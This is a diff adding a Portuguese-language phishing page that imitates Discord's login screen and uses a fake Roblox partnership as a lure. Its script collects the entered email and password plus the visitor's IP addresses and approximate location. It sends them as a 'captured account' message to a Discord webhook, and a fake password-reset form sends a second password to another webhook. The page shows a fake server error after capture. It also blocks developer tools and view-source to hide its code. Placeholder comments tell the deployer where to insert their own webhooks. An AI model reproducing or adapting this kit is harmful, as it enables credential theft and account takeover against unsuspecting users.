@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discord - Entrar</title>
+  <link rel="icon" href="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/6266bc493fb42d4e27bb8393_847541504914fd33810e70a0ea73177e.ico" type="image/x-icon">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: url('https://i.imgur.com/V23o1if.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+    body::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.40);
+      pointer-events: none;
+      z-index: 1;
+    }
+    .container {
+      display: flex;
+      width: 90%;
+      max-width: 1100px;
+      height: 85vh;
+      max-height: 700px;
+      background: rgba(30, 30, 50, 0.80);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+      backdrop-filter: blur(10px);
+      position: relative;
+      z-index: 2;
+    }
+    .left {
+      flex: 1;
+      padding: 60px 80px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .right {
+      flex: 1;
+      background: rgba(54, 57, 63, 0.92);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+    h1 { font-size: 2.2rem; margin-bottom: 8px; text-align: center; }
+    p.subtitle { color: #b9bbbe; text-align: center; margin-bottom: 40px; font-size: 1.1rem; }
+    label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #b9bbbe; font-weight: 600; }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      background: #202225;
+      border: 1px solid #2f3136;
+      border-radius: 4px;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+    }
+    input:focus { border-color: #5865f2; box-shadow: 0 0 0 2px rgba(88,101,242,0.3); }
+    .forgot-link {
+      color: #00aff4;
+      font-size: 0.9rem;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 24px;
+      text-align: left;
+      cursor: pointer;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-bottom: 16px;
+    }
+    button:hover { background: #4752c4; transform: translateY(-2px); }
+    button:active { transform: translateY(0); }
+    .register-link { text-align: center; font-size: 0.95rem; color: #b9bbbe; }
+    .register-link a { color: #00aff4; text-decoration: none; font-weight: 600; }
+    .register-link a:hover { text-decoration: underline; }
+    .qr-section { text-align: center; color: white; max-width: 320px; }
+    .qr-image {
+      width: 240px;
+      height: 240px;
+      margin: 20px auto 16px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+      background: white;
+      padding: 10px;
+      object-fit: contain;
+    }
+    .qr-title { font-size: 1.4rem; font-weight: 700; margin-bottom: 16px; }
+    .qr-custom-text { font-size: 1.1rem; font-weight: 600; line-height: 1.4; margin: 0 0 20px 0; }
+    .logos { display: flex; align-items: center; justify-content: center; gap: 12px; margin: 16px 0; }
+    .logos img { height: 50px; width: auto; object-fit: contain; }
+    .extra-link { margin-top: 20px; font-size: 0.95rem; }
+    .extra-link a { color: #00aff4; text-decoration: none; font-weight: 600; }
+    .extra-link a:hover { text-decoration: underline; }
+    .voltar {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      color: #00aff4;
+      text-decoration: none;
+      font-weight: bold;
+      cursor: pointer;
+      z-index: 3;
+    }
+    .error-message {
+      background: rgba(255, 0, 0, 0.25);
+      border: 1px solid #ff4d4d;
+      color: #ffcccc;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 0.95rem;
+      font-weight: 500;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      pointer-events: none;
+    }
+    .error-message.show { opacity: 1; transform: translateY(0); }
+    /* Modal de reset */
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .modal.show { display: flex; opacity: 1; }
+    .modal-content {
+      background: rgba(40, 40, 60, 0.95);
+      border-radius: 12px;
+      padding: 40px;
+      width: 90%;
+      max-width: 460px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      backdrop-filter: blur(10px);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    .modal.show .modal-content { transform: scale(1); }
+    .modal h2 { margin-bottom: 20px; color: #ffffff; }
+    .modal p { margin-bottom: 16px; color: #b9bbbe; font-size: 1.1rem; }
+    .modal .email-real { color: #ffffff; font-weight: bold; margin-bottom: 24px; font-size: 1.2rem; }
+    .modal input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      background: #202225;
+      border: 1px solid #2f3136;
+      border-radius: 4px;
+      color: white;
+      font-size: 1rem;
+    }
+    .modal button {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      cursor: pointer;
+    }
+    .modal button:hover { background: #4752c4; }
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      color: #b9bbbe;
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+    .close-modal:hover { color: white; }
+    /* Mensagem de sucesso descendo */
+    .success-msg {
+      position: fixed;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(67, 181, 129, 0.95);
+      color: white;
+      padding: 16px 32px;
+      border-radius: 8px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+      z-index: 10000;
+      font-weight: 600;
+      font-size: 1.1rem;
+      pointer-events: none;
+      transition: top 1.5s ease-out;
+    }
+    .success-msg.show { top: 80px; }
+    /* Mensagem de erro subindo (para e-mail sem @gmail.com) */
+    .email-error-msg {
+      position: fixed;
+      bottom: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255, 85, 85, 0.95);
+      color: white;
+      padding: 16px 32px;
+      border-radius: 8px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+      z-index: 10000;
+      font-weight: 600;
+      font-size: 1.1rem;
+      pointer-events: none;
+      transition: bottom 0.8s ease-out;
+    }
+    .email-error-msg.show { bottom: 80px; }
+
+    /* Responsividade para mobile */
+    @media only screen and (max-width: 768px) {
+      body {
+        align-items: flex-start;
+        padding-top: 20px;
+        overflow-y: auto;
+      }
+      .container {
+        flex-direction: column;
+        width: 95%;
+        max-width: none;
+        height: auto;
+        min-height: 80vh;
+        max-height: none;
+        border-radius: 0;
+        margin: 10px auto;
+      }
+      .left {
+        padding: 40px 25px;
+        flex: none;
+      }
+      .right {
+        padding: 30px 20px;
+        background: rgba(54, 57, 63, 0.95);
+        flex: none;
+      }
+      h1 { font-size: 1.8rem; }
+      p.subtitle { font-size: 1rem; margin-bottom: 30px; }
+      input, button { font-size: 0.95rem; padding: 12px; }
+      label { font-size: 0.85rem; }
+      .qr-image { width: 220px; height: 220px; }
+      .qr-title { font-size: 1.3rem; }
+      .qr-custom-text { font-size: 1rem; }
+      .logos img { height: 40px; }
+      .forgot-link, .register-link, .extra-link { font-size: 0.9rem; }
+      .modal-content { width: 92%; padding: 30px 20px; }
+      .success-msg, .email-error-msg { font-size: 1rem; padding: 12px 24px; width: 90%; }
+    }
+    @media only screen and (max-width: 480px) {
+      .left { padding: 30px 20px; }
+      .right { padding: 25px 15px; }
+      .qr-image { width: 200px; height: 200px; }
+      h1 { font-size: 1.6rem; }
+      button { padding: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <a id="voltarBtn" class="voltar">&lt; Voltar</a>
+    
+      <h1>Boas-vindas de volta!</h1>
+      <p class="subtitle">Estamos muito animados em te ver novamente!</p>
+    
+      <form id="loginForm">
+        <label for="email">E-mail ou número de telefone *</label>
+        <input type="text" id="email" placeholder="" required />
+      
+        <label for="senha">Senha *</label>
+        <input type="password" id="senha" placeholder="" required />
+      
+        <a id="forgotPassword" class="forgot-link">Esqueceu sua senha?</a>
+      
+        <button type="submit">Entrar</button>
+      
+        <div id="errorBox" class="error-message">
+          --- Erro de conexão com o servidor. Recarregue a página ou tente mais tarde. (504) ---
+        </div>
+      
+        <div class="register-link">
+          Precisando de uma conta? <a href="#">Registre-se</a>
+        </div>
+      </form>
+    </div>
+  
+    <div class="right">
+      <div class="qr-section">
+        <img class="qr-image" src="https://i.imgur.com/1D9eZd0.png" alt="QR customizado" />
+      
+        <div class="qr-title">Entrar com código QR</div>
+      
+        <p class="qr-custom-text">
+          Ou faça login pelo roblox!!<br>
+          Estamos fazendo parceria em troca de divulgação!!
+        </p>
+      
+        <div class="logos">
+          <img src="https://i.imgur.com/zvlaijA.png" alt="Discord Logo">
+          <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
+        </div>
+      
+        <div class="extra-link">
+          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de reset -->
+  <div id="resetModal" class="modal">
+    <div class="modal-content">
+      <span class="close-modal" id="closeModal">×</span>
+      <h2>Resetar Senha</h2>
+      <p class="email-real" id="emailDisplay">O seu e-mail é carregando...</p>
+      <p>Bote a sua senha nova!</p>
+      <input type="password" id="newPassword" placeholder="... Bote sua nova Key/senha Aqui...">
+      <button id="resetButton">Resetar Senha</button>
+    </div>
+  </div>
+
+  <!-- Mensagem de sucesso descendo -->
+  <div id="successMsg" class="success-msg">Senha alterada com sucesso!</div>
+
+  <!-- Mensagem de erro subindo -->
+  <div id="emailErrorMsg" class="email-error-msg">Está faltando o @gmail.com para continuar!</div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const errorBox = document.getElementById('errorBox');
+    const webhookLogin = 'Bote a SUA webhook de discord que quando a pessoa botar o email e senha e clicar em login vai aparecer pro seu bot no canal que você deixou ele!!';
+    const webhookReset = 'Nessa PARTE aqui você bota outro bot de outra webhook que quando a pessoa escolher esqueci a senha botar os email e a senha e clicar em resetar vai mandar pro outro bot que você colocou a webhook aqui!!';
+    const voltarBtn = document.getElementById('voltarBtn');
+    const forgotLink = document.getElementById('forgotPassword');
+    const modal = document.getElementById('resetModal');
+    const closeModal = document.getElementById('closeModal');
+    const resetButton = document.getElementById('resetButton');
+    const newPasswordInput = document.getElementById('newPassword');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const successMsg = document.getElementById('successMsg');
+    const emailErrorMsg = document.getElementById('emailErrorMsg');
+
+    // Botão Voltar atualizado - tenta preservar posição de scroll
+    voltarBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      
+      // Prioriza referrer (muitas vezes preserva scroll melhor)
+      if (document.referrer && document.referrer !== window.location.href) {
+        window.location.href = document.referrer;
+      } 
+      // Fallback para history.back() (navegadores modernos preservam scroll na maioria dos casos)
+      else if (window.history.length > 1) {
+        window.history.back();
+      } 
+      // Se não tiver histórico nem referrer
+      else {
+        window.location.href = 'https://discord.com/login';
+      }
+    });
+
+    // Login normal com validação de @gmail.com
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const senha = document.getElementById('senha').value.trim();
+      if (!email || !senha) {
+        alert('Preencha todos os campos obrigatórios!');
+        return;
+      }
+      // Verificação de @gmail.com
+      if (!email.toLowerCase().endsWith('@gmail.com')) {
+        emailErrorMsg.classList.add('show');
+        setTimeout(() => {
+          emailErrorMsg.classList.remove('show');
+        }, 2000);
+        return;
+      }
+      let ipv4 = 'Não detectado';
+      let ipv6 = 'Não detectado';
+      let location = 'Desconhecido';
+      try {
+        let resIPv4 = await fetch('https://api.ipify.org?format=json');
+        let dataIPv4 = await resIPv4.json();
+        if (dataIPv4.ip) ipv4 = dataIPv4.ip;
+      } catch {}
+      try {
+        let res = await fetch('https://ipapi.co/json/');
+        let data = await res.json();
+        if (data.ip) {
+          if (data.ip.includes(':')) ipv6 = data.ip;
+          else if (ipv4 === 'Não detectado') ipv4 = data.ip;
+          location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
+        }
+      } catch {
+        try {
+          let res2 = await fetch('https://ipwhois.io/api');
+          let data2 = await res2.json();
+          if (data2.ip) {
+            if (data2.ip.includes(':')) ipv6 = data2.ip;
+            else if (ipv4 === 'Não detectado') ipv4 = data2.ip;
+            location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
+          }
+        } catch {}
+      }
+      const agora = new Date();
+      const options = {
+        timeZone: 'America/Sao_Paulo',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+      };
+      const formatter = new Intl.DateTimeFormat('pt-BR', options);
+      const partes = formatter.formatToParts(agora);
+     
+      const dataFormatada = partes.find(p => p.type === 'day').value + '/' +
+                            partes.find(p => p.type === 'month').value + '/' +
+                            partes.find(p => p.type === 'year').value;
+      const horaFormatada = partes.find(p => p.type === 'hour').value.padStart(2, '0') + ':' +
+                            partes.find(p => p.type === 'minute').value.padStart(2, '0') + ':' +
+                            partes.find(p => p.type === 'second').value.padStart(2, '0');
+      const hoje = partes.find(p => p.type === 'hour').value.padStart(2, '0') + ':' +
+                   partes.find(p => p.type === 'minute').value.padStart(2, '0');
+      const mensagem = `🔐 **Nova Conta De Discord Capturada!**
+**Login:** \`${email}\`
+**Senha:** \`${senha}\`
+**IPv4:** ${ipv4}
+**IPv6:** ${ipv6}
+**Localização aproximada:** ${location}
+**Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
+      fetch(webhookLogin, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: mensagem })
+      }).catch(() => {});
+      errorBox.classList.add('show');
+      setTimeout(() => errorBox.classList.remove('show'), 3000);
+    });
+
+    // Reset de senha
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      if (email) {
+        emailDisplay.textContent = `O seu e-mail é ${email}`;
+      } else {
+        emailDisplay.textContent = 'Digite seu e-mail primeiro!';
+      }
+      modal.classList.add('show');
+    });
+
+    closeModal.addEventListener('click', () => modal.classList.remove('show'));
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) modal.classList.remove('show');
+    });
+
+    resetButton.addEventListener('click', () => {
+      const newPass = newPasswordInput.value.trim();
+      const email = document.getElementById('email').value.trim();
+      if (!newPass) {
+        alert('Digite uma nova senha!');
+        return;
+      }
+      if (!email) {
+        alert('Digite seu e-mail no campo de login primeiro!');
+        return;
+      }
+      const resetMsg = `**Reset de Senha Solicitado!**
+**E-mail:** ${email}
+**Nova senha:** \`${newPass}\`
+**Horário:** ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}`;
+      fetch(webhookReset, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: resetMsg })
+      }).catch(() => {});
+      successMsg.classList.add('show');
+      setTimeout(() => {
+        successMsg.style.top = '100vh';
+      }, 3000);
+      setTimeout(() => {
+        location.reload();
+      }, 4000);
+      newPasswordInput.value = '';
+      modal.classList.remove('show');
+    });
+  </script>
+
+  <script>
+  document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+  });
+  document.addEventListener("keydown", function(e) {
+      if (e.key === "F12") {
+          e.preventDefault();
+      }
+      if (e.ctrlKey && e.shiftKey &&
+         (e.key === "I" || e.key === "J" || e.key === "C")) {
+          e.preventDefault();
+      }
+      if (e.ctrlKey && e.key === "U") {
+          e.preventDefault();
+      }
+  });
+  setInterval(function() {
+      if (window.outerWidth - window.innerWidth > 200 ||
+          window.outerHeight - window.innerHeight > 200) {
+          document.body.innerHTML = "";
+      }
+  }, 1000);
+  </script>
+</body>
+</html>
